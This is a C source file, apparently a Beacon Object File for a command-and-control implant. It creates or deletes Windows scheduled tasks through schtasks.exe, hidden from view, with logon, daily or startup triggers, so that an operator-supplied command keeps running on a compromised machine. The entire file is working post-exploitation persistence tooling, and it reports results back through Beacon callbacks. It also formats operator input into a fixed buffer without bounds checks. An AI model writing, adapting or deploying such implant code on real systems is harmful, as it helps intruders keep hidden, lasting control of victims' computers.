/*
 * persist_schtask.c - Create or delete scheduled tasks via schtasks.exe
 *
 * Args: action  (string: "create" / "delete")
 *       task_name (string)
 *       command   (string, required for "create")
 *       trigger   (string: "logon" / "daily" / "startup", required for "create")
 */

#include <windows.h>
#define BOF
#include "beacon.h"

/* DFR imports */
DFR(KERNEL32, CreatePipe)
DFR(KERNEL32, CreateProcessA)
DFR(KERNEL32, WaitForSingleObject)
DFR(KERNEL32, ReadFile)
DFR(KERNEL32, CloseHandle)
DFR(KERNEL32, GetLastError)
DFR(KERNEL32, SetHandleInformation)

void go(char* args, int len) {
    datap parser;
    int   action_sz = 0, name_sz = 0, cmd_sz = 0, trig_sz = 0;
    char* action    = NULL;
    char* task_name = NULL;
    char* command   = NULL;
    char* trigger   = NULL;
    char  cmd_line[1024];

    SECURITY_ATTRIBUTES sa;
    HANDLE hReadPipe  = NULL;
    HANDLE hWritePipe = NULL;
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    char   output_buf[4096];
    DWORD  bytes_read = 0;

    BeaconDataParse(&parser, args, len);
    action    = BeaconDataExtract(&parser, &action_sz);
    task_name = BeaconDataExtract(&parser, &name_sz);
    command   = BeaconDataExtract(&parser, &cmd_sz);
    trigger   = BeaconDataExtract(&parser, &trig_sz);

    if (action == NULL || action_sz <= 1) {
        BeaconPrintf(CALLBACK_ERROR, "Missing required argument: action");
        return;
    }

    if (task_name == NULL || name_sz <= 1) {
        BeaconPrintf(CALLBACK_ERROR, "Missing required argument: task_name");
        return;
    }

    /* Build command line */
    if (_stricmp(action, "create") == 0) {
        if (command == NULL || cmd_sz <= 1) {
            BeaconPrintf(CALLBACK_ERROR,
                         "Missing required argument: command (for create)");
            return;
        }
        if (trigger == NULL || trig_sz <= 1) {
            BeaconPrintf(CALLBACK_ERROR,
                         "Missing required argument: trigger (for create)");
            return;
        }

        /* Validate trigger value */
        if (_stricmp(trigger, "logon") != 0 &&
            _stricmp(trigger, "daily") != 0 &&
            _stricmp(trigger, "startup") != 0) {
            BeaconPrintf(CALLBACK_ERROR,
                         "Invalid trigger: %s (use logon/daily/startup)", trigger);
            return;
        }

        wsprintfA(cmd_line,
                  "schtasks /Create /TN \"%s\" /TR \"%s\" /SC %s /F",
                  task_name, command, trigger);

    } else if (_stricmp(action, "delete") == 0) {
        wsprintfA(cmd_line,
                  "schtasks /Delete /TN \"%s\" /F",
                  task_name);

    } else {
        BeaconPrintf(CALLBACK_ERROR, "Unknown action: %s (use create/delete)",
                     action);
        return;
    }

    /* Set up pipe to capture stdout */
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = NULL;

    if (!KERNEL32$CreatePipe(&hReadPipe, &hWritePipe, &sa, 0)) {
        BeaconPrintf(CALLBACK_ERROR, "CreatePipe failed: %lu",
                     KERNEL32$GetLastError());
        return;
    }

    /* Ensure read end is not inherited */
    KERNEL32$SetHandleInformation(hReadPipe, HANDLE_FLAG_INHERIT, 0);

    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdOutput = hWritePipe;
    si.hStdError  = hWritePipe;
    memset(&pi, 0, sizeof(pi));

    if (!KERNEL32$CreateProcessA(NULL, cmd_line, NULL, NULL, TRUE,
            CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        BeaconPrintf(CALLBACK_ERROR, "CreateProcess failed: %lu",
                     KERNEL32$GetLastError());
        KERNEL32$CloseHandle(hReadPipe);
        KERNEL32$CloseHandle(hWritePipe);
        return;
    }

    /* Close write end so ReadFile can detect EOF */
    KERNEL32$CloseHandle(hWritePipe);
    hWritePipe = NULL;

    KERNEL32$WaitForSingleObject(pi.hProcess, 30000);

    /* Read captured output */
    memset(output_buf, 0, sizeof(output_buf));
    KERNEL32$ReadFile(hReadPipe, output_buf, sizeof(output_buf) - 1,
                      &bytes_read, NULL);

    if (bytes_read > 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "[*] schtasks output:\n%s", output_buf);
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Scheduled task %s: %s",
                 action, task_name);

    /* Cleanup */
    KERNEL32$CloseHandle(hReadPipe);
    KERNEL32$CloseHandle(pi.hProcess);
    KERNEL32$CloseHandle(pi.hThread);
}
